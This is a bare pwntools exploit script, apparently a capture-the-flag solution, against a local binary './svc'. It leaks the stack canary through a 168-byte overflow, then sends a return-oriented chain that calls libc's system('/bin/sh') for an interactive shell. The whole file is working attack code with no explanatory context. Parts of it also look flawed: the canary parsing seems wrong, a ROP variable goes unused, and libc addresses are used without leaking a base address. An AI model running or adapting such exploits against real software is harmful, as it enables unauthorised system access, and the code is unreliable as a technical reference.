from pwn import *

elf = context.binary = ELF("./svc")
libc = elf.libc
proc = process("./svc")

proc.recvuntil(b">>")
proc.sendline(b"1")

proc.recvuntil(b">>")
payload = b"A"*168
proc.sendline(payload)

proc.recvuntil(b">>")
proc.sendline(b"2")

data = proc.recvuntil(b">>")
pattern = re.compile(b'\n(.{8})\n')
canary_leak = pattern.search(data).group(1)
canary_leak = int("0x" + canary_leak.hex(), 16) - 1
print(hex(canary_leak))

proc.sendline(b"1")

payload = b"A"*168 + p64(canary_leak) + b"A"*8
ROPchain = b""
ROPchain += p64(0x00000000004008b1)
payload += p64(0x0000000000400ea3) # pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

proc.sendline(payload);
proc.interactive()
